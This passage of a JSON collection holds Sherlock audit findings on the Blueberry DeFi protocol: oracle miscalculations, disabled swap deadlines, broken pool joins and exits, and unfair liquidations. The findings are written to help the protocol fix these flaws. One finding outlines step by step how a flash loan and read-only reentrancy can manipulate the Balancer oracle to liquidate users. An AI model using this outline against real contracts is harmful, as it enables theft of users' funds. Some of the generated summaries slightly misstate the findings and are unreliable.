      "content": "Source: https://github.com/sherlock-audit/2023-04-blueberry-judging/issues/46 \n\n## Found by \nCh\\_301, cducrest-brainbot, cuthalion0x, nobody2018\n## Summary\n\nThe function to open a position for the AuraSpell does not join the pool due to wrong conditional check.\n\n## Vulnerability Detail\n\nThe function deposits collateral into the bank, borrow tokens, and attempts to join the pool:\n\n```solidity\n    function openPositionFarm(\n        OpenPosParam calldata param\n    )\n        external\n        existingStrategy(param.strategyId)\n        existingCollateral(param.strategyId, param.collToken)\n    {\n        ...\n        // 1. Deposit isolated collaterals on Blueberry Money Market\n        _doLend(param.collToken, param.collAmount);\n\n        // 2. Borrow specific amounts\n        uint256 borrowBalance = _doBorrow(\n            param.borrowToken,\n            param.borrowAmount\n        );\n\n        // 3. Add liquidity on Balancer, get BPT\n        {\n            IBalancerVault vault = wAuraPools.getVault(lpToken);\n            _ensureApprove(param.borrowToken, address(vault), borrowBalance);\n\n            (address[] memory tokens, uint256[] memory balances, ) = wAuraPools\n                .getPoolTokens(lpToken);\n            uint[] memory maxAmountsIn = new uint[](2);\n            maxAmountsIn[0] = IERC20(tokens[0]).balanceOf(address(this));\n            maxAmountsIn[1] = IERC20(tokens[1]).balanceOf(address(this));\n\n            uint totalLPSupply = IBalancerPool(lpToken).totalSupply();\n            // compute in reverse order of how Balancer's `joinPool` computes tokenAmountIn\n            uint poolAmountFromA = (maxAmountsIn[0] * totalLPSupply) /\n                balances[0];\n            uint poolAmountFromB = (maxAmountsIn[1] * totalLPSupply) /\n                balances[1];\n            uint poolAmountOut = poolAmountFromA > poolAmountFromB\n                ? poolAmountFromB\n                : poolAmountFromA;\n\n            bytes32 poolId = bytes32(param.farmingPoolId);\n            if (poolAmountOut > 0) {\n                vault.joinPool(\n                    poolId,\n                    address(this),\n                    address(this),\n                    IBalancerVault.JoinPoolRequest(\n                        tokens,\n                        maxAmountsIn,\n                        \"\",\n                        false\n                    )\n                );\n            }\n        }\n        ...\n    }\n```\n\nThe function only borrowed one type of tokens from the bank so the contract only owns one type of token. As a result one of the `maxAmountsIn` value is 0. Either `poolAmountFromA` or `poolAmountFromB` is 0 as a result of computation. `poolAmountOut` is the minimal value of `poolAmountFromA` and `poolAmountFromB`, it is 0. The following check `if (poolAmountOut > 0)` will always fail and the pool will never be joined.\n\n## Impact\n\nThe rest of the function proceeds correctly without reverting. Users will think they joined the pool and are earning reward while they are not earning anything. This is a loss of funds to the user.\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2023-04-blueberry/blob/96eb1829571dc46e1a387985bd56989702c5e1dc/blueberry-core/contracts/spell/AuraSpell.sol#L63-L147\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nIt is hard to tell the intent of the developer from this check. Maybe the issue is simply that `poolAmountOut` should be the sum or the max value out of `poolAmountFromA` and `poolAmountFromB` instead of the min.",
      "summary": "\nThis bug report is about an issue with the function openPositionFarm() in the AuraSpell smart contract. The issue is that the function does not join the pool due to a wrong conditional check. The function deposits collateral into the bank, borrows tokens, and attempts to join the pool, but the conditional check only borrows one type of token from the bank, so one of the maxAmountsIn values is 0. This means that either poolAmountFromA or poolAmountFromB is 0, and the following check `if (poolAmountOut > 0)` will always fail and the pool will never be joined. This means that users will think they joined the pool and are earning rewards while they are not, resulting in a loss of funds to the user. The recommendation is to change the computation of `poolAmountOut` to either the sum or the max value out of `poolAmountFromA` and `poolAmountFromB` instead of the min.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Blueberry Update",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-04-blueberry-judging/issues/46",
      "tags": [
        "Lending Pool",
        "Coding-Bug"
      ],
      "finders": [
        "cducrest-brainbot",
        "Ch\\_301",
        "nobody2018",
        "cuthalion0x"
      ]
    },
    {
      "id": "18495",
      "title": "M-1: Calculation underflow/overflow in BalancerPairOracle, which will affect pools in Aura Finance",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-04-blueberry-judging/issues/11 \n\n## Found by \nn1punp\n## Summary\nLP price calculation for Balancer Pair in BalancerPairOracle will produce calculation underflow/overflow (so Aura pools won't work too).\n\n## Vulnerability Detail\n- The values r0, r1 can underflow, e.g. if resA < resB --> r0 = 0, so it'll go to the else case --> and so `ratio` will be 0 --> `fairResA` calculation will revert upon dividing by 0.\n- There are also other math calculations there that will cause reverts, e.g. ratio ** wB will lead to overflow. What you'd need here is Balancer's implementation of `bpow` or similar.\n\n## Impact\nLP price for Balancer-like collateral token will revert in most cases, if not all.\n\n## Code Snippet\nhttps://github.com/sherlock-audit/2023-04-blueberry/blob/main/blueberry-core/contracts/oracle/BalancerPairOracle.sol#L53-L64\n\n## Tool used\n\nManual Review\n\n## Recommendation\n- Change the calculation logic so it aligns with Alpha's original implementation (with precision control), e.g. https://github.com/AlphaFinanceLab/alpha-homora-v2-contract/blob/master/contracts/oracle/BalancerPairOracle.sol#L42-L53 (you can see there's BONE extra precision in each step)\n\n\n\n## Discussion\n\n**n1punp**\n\nEscalate for 10 USDC.\nI think this is incorrectly **excluded**. The issue is not related to **flashloan** via **BalancerPairOracle**, but rather an organic math overflow/underflow, since the implementation is directly using 0.8.x's default SafeMath mode. Upon certain conditions (e.g. `resA < resB` the calculation will always revert).\n\n**sherlock-admin**\n\n > Escalate for 10 USDC.\n> I think this is incorrectly **excluded**. The issue is not related to **flashloan** via **BalancerPairOracle**, but rather an organic math overflow/underflow, since the implementation is directly using 0.8.x's default SafeMath mode. Upon certain conditions (e.g. `resA < resB` the calculation will always revert).\n\nYou've created a valid escalation for 10 USDC!\n\nTo remove the escalation from consideration: Delete your comment.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**ctf-sec**\n\nI don't think this report has sufficient prove\n\n**hrishibhat**\n\nEscalation accepted\n\nConsidering this issue a valid medium \n\n**sherlock-admin**\n\n> Escalation accepted\n> \n> Considering this issue a valid medium \n\n    This issue's escalations have been accepted!\n\n    Contestants' payouts and scores will be updated according to the changes made on this issue.",
      "summary": "\nA bug was identified in the BalancerPairOracle contract, which is used by Aura Finance pools. The bug is a calculation underflow/overflow, which will cause the LP price calculation to revert in most cases. The bug was found by manual review and the code snippet can be found at the provided GitHub link. The impact of the bug is that LP prices for Balancer-like collateral tokens will not be calculated correctly. The recommendation is to change the calculation logic to align with Alpha's original implementation, which has precision control. The bug was accepted as a valid medium and the contest payout and scores will be updated accordingly.",
      "quality_score": 2,
      "rarity_score": 3,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Blueberry Update",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-04-blueberry-judging/issues/11",
      "tags": [
        "Wrong Math",
        "Uniswap",
        "Overflow/Underflow",
        "Lending Pool"
      ],
      "finders": [
        "n1punp"
      ]
    },
    {
      "id": "18494",
      "title": "H-14: Deadline check is not effective, allowing outdated slippage and allow pending transaction to be unexpected executed",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2023-04-blueberry-judging/issues/145 \n\n## Found by \nBauer, Breeje, ctf\\_sec\n## Summary\n\nDeadline check is not effective, allowing outdated slippage and allow pending transaction to be unexpected executed\n\n## Vulnerability Detail\n\nIn the current implementation in CurveSpell.sol\n\n```solidity\n{\n\t// 2. Swap rewards tokens to debt token\n\tuint256 rewards = _doCutRewardsFee(CRV);\n\t_ensureApprove(CRV, address(swapRouter), rewards);\n\tswapRouter.swapExactTokensForTokens(\n\t\trewards,\n\t\t0,\n\t\tswapPath,\n\t\taddress(this),\n\t\ttype(uint256).max\n\t);\n}\n```\n\nthe deadline check is set to type(uint256).max, which means the deadline check is disabled!\n\nIn IChiSpell. the swap is directedly call on the pool instead of the router\n\n```solidity\nSWAP_POOL.swap(\n\taddress(this),\n\t// if withdraw token is Token0, then swap token1 -> token0 (false)\n\t!isTokenA,\n\tamountToSwap.toInt256(),\n\tisTokenA\n\t\t? param.sqrtRatioLimit + deltaSqrt\n\t\t: param.sqrtRatioLimit - deltaSqrt, // slippaged price cap\n\tabi.encode(address(this))\n);\n```\n\nand it has no deadline check for the transaction when swapping\n\n## Impact\n\nAMMs provide their users with an option to limit the execution of their pending actions, such as swaps or adding and removing liquidity. The most common solution is to include a deadline timestamp as a parameter (for example see Uniswap V2 and Uniswap V3). If such an option is not present, users can unknowingly perform bad trades:\n\nAlice wants to swap 100 tokens for 1 ETH and later sell the 1 ETH for 1000 DAI.\n\nThe transaction is submitted to the mempool, however, Alice chose a transaction fee that is too low for miners to be interested in including her transaction in a block. The transaction stays pending in the mempool for extended periods, which could be hours, days, weeks, or even longer.\n\nWhen the average gas fee dropped far enough for Alice's transaction to become interesting again for miners to include it, her swap will be executed. In the meantime, the price of ETH could have drastically changed. She will still get 1 ETH but the DAI value of that output might be significantly lower. \n\nShe has unknowingly performed a bad trade due to the pending transaction she forgot about.\n\nAn even worse way this issue can be maliciously exploited is through MEV:\n\nThe swap transaction is still pending in the mempool. Average fees are still too high for miners to be interested in it. \n\nThe price of tokens has gone up significantly since the transaction was signed, meaning Alice would receive a lot more ETH when the swap is executed. But that also means that her maximum slippage value (sqrtPriceLimitX96 and minOut in terms of the Spell contracts) is outdated and would allow for significant slippage.\n\nA MEV bot detects the pending transaction. Since the outdated maximum slippage value now allows for high slippage, the bot sandwiches Alice, resulting in significant profit for the bot and significant loss for Alice.\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2023-04-blueberry/blob/main/blueberry-core/contracts/spell/CurveSpell.sol#L162-L175\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nWe recommend the protocol use block.timstamp for swapping deadline for Uniswap V2 and swap with Unsiwap Router V3 instead of the pool directly!",
      "summary": "\nThis bug report is about an issue found in CurveSpell.sol, a smart contract used to provide liquidity to decentralized exchanges (DEXs). The issue is that the deadline check is set to type(uint256).max, which means the deadline check is disabled. This allows outdated slippage and pending transactions to be executed unexpectedly. \n\nThis issue can be maliciously exploited through the process of miner extractable value (MEV), where a MEV bot can detect a pending transaction and sandwich Alice, resulting in significant profit for the bot and significant loss for Alice. \n\nThe bug was found by Bauer, Breeje, and ctf_sec, and the code snippet can be found on GitHub.\n\nThe recommendation is that the protocol should use block.timestamp for swapping deadline for Uniswap V2 and swap with Unsiwap Router V3 instead of the pool directly.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Blueberry Update",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-04-blueberry-judging/issues/145",
      "tags": [
        "Uniswap",
        "Swap",
        "Slippage",
        "Lending Pool",
        "Deadline"
      ],
      "finders": [
        "Bauer",
        "Breeje",
        "ctf\\_sec"
      ]
    },
    {
      "id": "18493",
      "title": "H-13: `BalancerPairOracle` can be manipulated using read-only reentrancy",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2023-04-blueberry-judging/issues/141 \n\n## Found by \ncuthalion0x\n## Summary\n\n`BalancerPairOracle.getPrice` makes an external call to `BalancerVault.getPoolTokens` without checking the Balancer Vault's reentrancy guard. As a result, the oracle can be trivially manipulated to liquidate user positions prematurely.\n\n## Vulnerability Detail\n\nIn February, the Balancer team disclosed a read-only reentrancy vulnerability in the Balancer Vault. The detailed disclosure can be found [here](https://forum.balancer.fi/t/reentrancy-vulnerability-scope-expanded/4345). In short, all Balancer pools are susceptible to manipulation of their external queries, and all integrations must now take an extra step of precaution when consuming data. Via reentrancy, an attacker can force token balances and BPT supply to be out of sync, creating very inaccurate BPT prices.\n\nSome protocols, such as Sentiment, remained unaware of this issue for a few months and were later [hacked](https://twitter.com/spreekaway/status/1643313471180644360) as a result.\n\n`BalancerPairOracle.getPrice` makes a price calculation of the form `f(balances) / pool.totalSupply()`, so it is clearly vulnerable to synchronization issues between the two data points. A rough outline of the attack might look like this:\n\n```solidity\nAttackerContract.flashLoan() ->\n    // Borrow lots of tokens and trigger a callback.\n    SomeProtocol.flashLoan() ->\n        AttackerContract.exploit()\n\nAttackerContract.exploit() ->\n    // Join a Balancer Pool using the borrowed tokens and send some ETH along with the call.\n    BalancerVault.joinPool() ->\n        // The Vault will return the excess ETH to the sender, which will reenter this contract.\n        // At this point in the execution, the BPT supply has been updated but the token balances have not.\n        AttackerContract.receive()\n\nAttackerContract.receive() ->\n    // Liquidate a position using the same Balancer Pool as collateral.\n    BlueBerryBank.liquidate() ->\n        // Call to the oracle to check the price.\n        BalancerPairOracle.getPrice() ->\n            // Query the token balances. At this point in the execution, these have not been updated (see above).\n            // So, the balances are still the same as before the start of the large pool join.\n            BalancerVaul.getPoolTokens()\n\n            // Query the BPT supply. At this point in the execution, the supply has already been updated (see above).\n            // So, it includes the latest large pool join, and as such the BPT supply has grown by a large amount.\n            BalancerPool.getTotalSupply()\n\n            // Now the price is computed using both balances and supply, and the result is much smaller than it should be.\n            price = f(balances) / pool.totalSupply()\n\n        // The position is liquidated under false pretenses.\n```\n\n## Impact\n\nUsers choosing Balancer pool positions (such as Aura vaults) as collateral can be prematurely liquidated due to unreliable price data.\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2023-04-blueberry/blob/main/blueberry-core/contracts/oracle/BalancerPairOracle.sol#L70-L92\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nThe Balancer team recommends utilizing their [official library](https://github.com/balancer/balancer-v2-monorepo/blob/3ce5138abd8e336f9caf4d651184186fffcd2025/pkg/pool-utils/contracts/lib/VaultReentrancyLib.sol) to safeguard queries such as `Vault.getPoolTokens`. However, the library makes a state-modifying call to the Balancer Vault, so it is not suitable for `view` functions such as `BalancerPairOracle.getPrice`. There are then two options:\n1. Invoke the library somewhere else. Perhaps insert a hook into critical system functions like `BlueBerryBank.liquidate`.\n2. Adapt a slightly different read-only solution that checks the Balancer Vault's reentrancy guard without actually entering.",
      "summary": "\nThis bug report is about the `BalancerPairOracle` contract, which is used to calculate the price of a Balancer Pool Token (BPT). The issue is that the `BalancerPairOracle.getPrice` function makes an external call to `BalancerVault.getPoolTokens` without checking the Balancer Vault's reentrancy guard. This means that the Oracle can be manipulated to liquidate user positions prematurely, as the price calculation is based on a combination of token balances and BPT supply.\n\nThe vulnerability was found by cuthalion0x and was initially disclosed by the Balancer team in February. It was later exploited in a hack of the Sentiment protocol.\n\nThe code snippet provided is from the `BalancerPairOracle.sol` file, line 70 to 92. The tool used was manual review.\n\nThe Balancer team recommends using their official library to safeguard queries such as `Vault.getPoolTokens`. However, this library makes a state-modifying call to the Balancer Vault, so it is not suitable for `view` functions such as `BalancerPairOracle.getPrice`. There are two possible solutions: 1. Invoke the library somewhere else, such as in critical system functions like `BlueBerryBank.liquidate`, or 2. Adapt a slightly different read-only solution that checks the Balancer Vault's reentrancy guard without actually entering.",
      "quality_score": 5,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Blueberry Update",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-04-blueberry-judging/issues/141",
      "tags": [
        "Read-only Reentrancy",
        "Oracle",
        "Flash Loan"
      ],
      "finders": [
        "cuthalion0x"
      ]
    },
    {
      "id": "18492",
      "title": "H-12: Pending CRV rewards are not accounted for and can cause unfair liquidations",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2023-04-blueberry-judging/issues/136 \n\n## Found by \n0x52\n## Summary\n\npendingRewards are factored into the health of a position so that the position collateral is fairly assessed. However WCurveGauge#pendingRewards doesn't return the proper reward tokens/amounts meaning that positions aren't valued correctly and users can be unfairly liquidated.\n\n## Vulnerability Detail\n\n[BlueBerryBank.sol#L408-L413](https://github.com/sherlock-audit/2023-04-blueberry/blob/main/blueberry-core/contracts/BlueBerryBank.sol#L408-L413)\n\n            (address[] memory tokens, uint256[] memory rewards) = IERC20Wrapper(\n                pos.collToken\n            ).pendingRewards(pos.collId, pos.collateralSize);\n            for (uint256 i; i < tokens.length; i++) {\n                rewardsValue += oracle.getTokenValue(tokens[i], rewards[i]);\n            }\n\nWhen BlueBerryBank is valuing a position it also values the pending rewards since they also have value. \n\n[WCurveGauge.sol#L106-L114](https://github.com/sherlock-audit/2023-04-blueberry/blob/main/blueberry-core/contracts/wrapper/WCurveGauge.sol#L106-L114)\n\n    function pendingRewards(\n        uint256 tokenId,\n        uint256 amount\n    )\n        public\n        view\n        override\n        returns (address[] memory tokens, uint256[] memory rewards)\n    {}\n\nAbove we see that WCurveGauge#pendingRewards returns empty arrays when called. This means that pending rewards are not factored in correctly and users can be liquidated when even when they should be safe.\n\n## Impact\n\nUser is liquidated when they shouldn't be\n\n## Code Snippet\n\n[WCurveGauge.sol#L106-L114](https://github.com/sherlock-audit/2023-04-blueberry/blob/main/blueberry-core/contracts/wrapper/WCurveGauge.sol#L106-L114)\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nChange WCurveGauge#pendingRewards to correctly return the pending rewards",
      "summary": "\nThis bug report is about an issue found in the BlueBerryBank smart contract, which is used to value positions. The bug is that the WCurveGauge#pendingRewards function doesn't return the proper reward tokens or amounts, meaning that positions aren't valued correctly and users can be unfairly liquidated. This is due to the fact that BlueBerryBank is valuing a position and also valuing the pending rewards, which have value. The impact of this bug is that users are liquidated when they shouldn't be. The bug was found through manual review, and the recommendation is to change WCurveGauge#pendingRewards to correctly return the pending rewards.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Blueberry Update",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-04-blueberry-judging/issues/136",
      "tags": [
        "Liquidation",
        "Coding-Bug",
        "Array"
      ],
      "finders": [
        "0x52"
      ]
    },
    {
      "id": "18491",
      "title": "H-11: ShortLongSpell#openPosition can cause user unexpected liquidation when increasing position size",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2023-04-blueberry-judging/issues/135 \n\n## Found by \n0x52, Ch\\_301\n## Summary\n\nWhen increasing a position, all collateral is sent to the user rather than being kept in the position. This can cause serious issues because this collateral keeps the user from being liquidated. It may unexpectedly leave the user on the brink of liquidation where a small change in price leads to their liquidation.\n\n## Vulnerability Detail\n\n[ShortLongSpell.sol#L129-L141](https://github.com/sherlock-audit/2023-04-blueberry/blob/main/blueberry-core/contracts/spell/ShortLongSpell.sol#L129-L141)\n\n        {\n            IBank.Position memory pos = bank.getCurrentPositionInfo();\n            address posCollToken = pos.collToken;\n            uint256 collSize = pos.collateralSize;\n            address burnToken = address(ISoftVault(strategy.vault).uToken());\n            if (collSize > 0) {\n                if (posCollToken != address(wrapper))\n                    revert Errors.INCORRECT_COLTOKEN(posCollToken);\n                bank.takeCollateral(collSize);\n                wrapper.burn(burnToken, collSize);\n                _doRefund(burnToken);\n            }\n        }\n\nIn the above lines we can see that all collateral is burned and the user is sent the underlying tokens. This is problematic as it sends all the collateral to the user, leaving the position collateralized by only the isolated collateral.\n\nBest case the user's transaction reverts but worst case they will be liquidated almost immediately.  \n\n## Impact\n\nUnfair liquidation for users\n\n## Code Snippet\n\n[ShortLongSpell.sol#L111-L151](https://github.com/sherlock-audit/2023-04-blueberry/blob/main/blueberry-core/contracts/spell/ShortLongSpell.sol#L111-L151)\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nDon't burn the collateral",
      "summary": "\nThis bug report is about ShortLongSpell#openPosition, a function in the ShortLongSpell.sol contract, which can cause users to experience unexpected liquidation when increasing their position size. The bug was discovered by 0x52 and Ch_301 using manual review.\n\nThe bug occurs when all of the collateral is sent to the user rather than kept in the position. This can lead to serious issues as the collateral is needed to prevent liquidation. As a result, users may find themselves on the brink of liquidation and a small change in price could lead to their liquidation.\n\nThe code snippet for this issue is found in ShortLongSpell.sol#L129-L141. Here, all of the collateral is burned and the user is sent the underlying tokens. This is problematic as it sends all the collateral to the user, leaving the position collateralized by only the isolated collateral.\n\nThe impact of this bug is that users may experience unfair liquidation. The recommendation is to not burn the collateral.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Blueberry Update",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-04-blueberry-judging/issues/135",
      "tags": [
        "Liquidation",
        "Configuration",
        "Business Logic"
      ],
      "finders": [
        "Ch\\_301",
        "0x52"
      ]
    },
    {
      "id": "18490",
      "title": "H-10: Balance check for swapToken in ShortLongSpell#_deposit is incorrect and will result in nonfunctional contract",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2023-04-blueberry-judging/issues/133 \n\n## Found by \n0x52, Ch\\_301, sinarette\n## Summary\n\nThe balance checks on ShortLongSpell#_withdraw are incorrect and will make contract basically nonfunctional \n\n## Vulnerability Detail\n\nswapToken is always vault.uToken. borrowToken is always required to be vault.uToken which means that swapToken == borrowToken. This means that the token borrowed is always required to be swapped. \n\n[ShortLongSpell.sol#L83-L89](https://github.com/sherlock-audit/2023-04-blueberry/blob/main/blueberry-core/contracts/spell/ShortLongSpell.sol#L83-L89)\n\n        uint256 strTokenAmt = _doBorrow(param.borrowToken, param.borrowAmount);\n\n        // 3. Swap borrowed token to strategy token\n        IERC20Upgradeable swapToken = ISoftVault(strategy.vault).uToken();\n        // swapData.fromAmount = strTokenAmt;\n        PSwapLib.megaSwap(augustusSwapper, tokenTransferProxy, swapData);\n        strTokenAmt = swapToken.balanceOf(address(this)) - strTokenAmt; <- @audit-issue will always revert on swap\n\nBecause swapToken == borrowToken if there is ever a swap then the swapToken balance will decrease. This causes L89 to always revert when a swap happens, making the contract completely non-functional\n\n## Impact\n\nShortLongSpell is nonfunctional\n\n## Code Snippet\n\n[ShortLongSpell.sol#L160-L202](https://github.com/sherlock-audit/2023-04-blueberry/blob/main/blueberry-core/contracts/spell/ShortLongSpell.sol#L160-L202)\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nRemove check",
      "summary": "\nThis bug report is about the balance check for swapToken in ShortLongSpell#_deposit being incorrect and resulting in a nonfunctional contract. It was found by 0x52, Ch\\_301 and sinarette using manual review. \n\nThe issue is that swapToken is always vault.uToken and borrowToken is always required to be vault.uToken which means that swapToken == borrowToken. This means that the token borrowed is always required to be swapped. Because swapToken == borrowToken, if there is ever a swap then the swapToken balance will decrease. This causes L89 to always revert when a swap happens, making the contract completely non-functional. \n\nThe impact of this bug is that ShortLongSpell is nonfunctional. The code snippet of the issue is located at ShortLongSpell.sol#L160-L202. The recommendation is to remove the check.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Blueberry Update",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-04-blueberry-judging/issues/133",
      "tags": [
        "Swap",
        "Coding-Bug"
      ],
      "finders": [
        "Ch\\_301",
        "sinarette",
        "0x52"
      ]
    },
    {
      "id": "18489",
      "title": "H-9: UniswapV3 sqrtRatioLimit doesn't provide slippage protection and will result in partial swaps",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2023-04-blueberry-judging/issues/132 \n\n## Found by \n0x52\n## Summary\n\nThe sqrtRatioLimit for UniV3 doesn't cause the swap to revert upon reaching that value. Instead it just cause the swap to partially fill. This is a [known issue](https://github.com/Uniswap/v3-core/blob/d8b1c635c275d2a9450bd6a78f3fa2484fef73eb/contracts/UniswapV3Pool.sol#L641) with using sqrtRatioLimit as can be seen here where the swap ends prematurely when it has been reached. This is problematic as this is meant to provide the user with slippage protection but doesn't.\n\n## Vulnerability Detail\n\nhttps://github.com/sherlock-audit/2023-04-blueberry/blob/main/blueberry-core/contracts/spell/IchiSpell.sol#L209-L223\n\n        if (amountToSwap > 0) {\n            SWAP_POOL = IUniswapV3Pool(vault.pool());\n            uint160 deltaSqrt = (param.sqrtRatioLimit *\n                uint160(param.sellSlippage)) / uint160(Constants.DENOMINATOR);\n            SWAP_POOL.swap(\n                address(this),\n                // if withdraw token is Token0, then swap token1 -> token0 (false)\n                !isTokenA,\n                amountToSwap.toInt256(),\n                isTokenA\n                    ? param.sqrtRatioLimit + deltaSqrt\n                    : param.sqrtRatioLimit - deltaSqrt, // slippaged price cap\n                abi.encode(address(this))\n            );\n        }\n\nsqrtRatioLimit is used as slippage protection for the user but is ineffective and depending on what tokens are being swapped, tokens may be left the in the contract which can be stolen by anyone.\n\n## Impact\n\nIncorrect slippage application can result in partial swaps and loss of funds\n\n## Code Snippet\n\n[IchiSpell.sol#L181-L236](https://github.com/sherlock-audit/2023-04-blueberry/blob/main/blueberry-core/contracts/spell/IchiSpell.sol#L181-L236)\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nCheck the amount received from the swap and compare it against some user supplied minimum",
      "summary": "\nThis bug report is about the issue H-9 which was found by 0x52. The sqrtRatioLimit for UniV3 doesn't cause the swap to revert upon reaching that value. Instead, it just causes the swap to partially fill. This is a known issue with using sqrtRatioLimit as can be seen in the code snippet, where the swap ends prematurely when it has been reached. This is problematic as this is meant to provide the user with slippage protection but doesn't. This incorrect slippage application can result in partial swaps and loss of funds. The code snippet provided is from IchiSpell.sol#L181-L236. The tool used to identify this bug was manual review. The recommendation given is to check the amount received from the swap and compare it against some user supplied minimum.",
      "quality_score": 5,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Blueberry Update",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-04-blueberry-judging/issues/132",
      "tags": [
        "Uniswap",
        "Swap",
        "Slippage",
        "Missing-Logic",
        "Configuration"
      ],
      "finders": [
        "0x52"
      ]
    },
    {
      "id": "18488",
      "title": "H-8: UserData for balancer pool exits is malformed and will permanently trap users",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2023-04-blueberry-judging/issues/129 \n\n## Found by \n0x52, cuthalion0x\n## Summary\n\nUserData for balancer pool exits is malformed and will result in all withdrawal attempts failing, trapping the user permanently. \n\n## Vulnerability Detail\n\n[AuraSpell.sol#L184-L189](https://github.com/sherlock-audit/2023-04-blueberry/blob/main/blueberry-core/contracts/spell/AuraSpell.sol#L184-L189)\n\n    wAuraPools.getVault(lpToken).exitPool(\n        IBalancerPool(lpToken).getPoolId(),\n        address(this),\n        address(this),\n        IBalancerVault.ExitPoolRequest(tokens, minAmountsOut, \"\", false)\n    );\n\nWe see above that UserData is encoded as \"\". This is problematic as it doesn't contain the proper data for exiting the pool, causing all exit request to fail and trap the user permanently.\n\nhttps://etherscan.io/address/0x5c6ee304399dbdb9c8ef030ab642b10820db8f56#code#F9#L50\n\n    function exactBptInForTokenOut(bytes memory self) internal pure returns (uint256 bptAmountIn, uint256 tokenIndex) {\n        (, bptAmountIn, tokenIndex) = abi.decode(self, (WeightedPool.ExitKind, uint256, uint256));\n    }\n\nUserData is decoded into the data shown above when using ExitKind = 0. Since the exit uses \"\" as the user data this will be decoded as 0 a.k.a [EXACT_BPT_IN_FOR_ONE_TOKEN_OUT](https://etherscan.io/address/0x5c6ee304399dbdb9c8ef030ab642b10820db8f56#code#F24#L50). This is problematic because the token index and bptAmountIn should also be encoded in user data for this kind of exit. Since it isn't the exit call will always revert and the user will be permanently trapped.\n\n## Impact\n\nUsers will be permanently trapped, unable to withdraw\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2023-04-blueberry/blob/main/blueberry-core/contracts/spell/AuraSpell.sol#L149-L224\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nEncode the necessary exit data in userData",
      "summary": "\nThis bug report is about an issue found in the code of the AuraSpell.sol contract. The code in question is located at https://github.com/sherlock-audit/2023-04-blueberry/blob/main/blueberry-core/contracts/spell/AuraSpell.sol#L184-L189. This code is responsible for handling the exit of users from a balancer pool. \n\nThe issue is that the UserData for the balancer pool exits is malformed and does not contain the proper data for exiting the pool. This will cause all exit requests to fail, trapping the user permanently. This issue was found by 0x52 and cuthalion0x while manually reviewing the code. \n\nThe impact of this issue is that users will be permanently trapped, unable to withdraw. The recommended solution to this issue is to encode the necessary exit data in the userData.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Blueberry Update",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-04-blueberry-judging/issues/129",
      "tags": [
        "Lending Pool",
        "Data Validation",
        "Configuration",
        "Coding-Bug"
      ],
      "finders": [
        "0x52",
        "cuthalion0x"
      ]
    },
    {
      "id": "18487",
      "title": "H-7: WAuraPools will irreversibly break if reward tokens are added to pool after deposit",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2023-04-blueberry-judging/issues/127 \n\n## Found by \n0x52, Ch\\_301\n## Summary\n\nWAuraPools will irreversibly break if reward tokens are added to pool after deposit due to an OOB error on accExtPerShare.\n\n## Vulnerability Detail\n\n[WAuraPools.sol#L166-L189](https://github.com/sherlock-audit/2023-04-blueberry/blob/main/blueberry-core/contracts/wrapper/WAuraPools.sol#L166-L189)\n\n        uint extraRewardsCount = IAuraRewarder(crvRewarder)\n            .extraRewardsLength(); <- @audit-issue rewardTokenCount pulled fresh\n        tokens = new address[](extraRewardsCount + 1);\n        rewards = new uint256[](extraRewardsCount + 1);\n\n        tokens[0] = IAuraRewarder(crvRewarder).rewardToken();\n        rewards[0] = _getPendingReward(\n            stCrvPerShare,\n            crvRewarder,\n            amount,\n            lpDecimals\n        );\n\n        for (uint i = 0; i < extraRewardsCount; i++) {\n            address rewarder = IAuraRewarder(crvRewarder).extraRewards(i);\n\n            @audit-issue attempts to pull from array which will be too small if tokens are added\n            uint256 stRewardPerShare = accExtPerShare[tokenId][i];\n            tokens[i + 1] = IAuraRewarder(rewarder).rewardToken();\n            rewards[i + 1] = _getPendingReward(\n                stRewardPerShare,\n                rewarder,\n                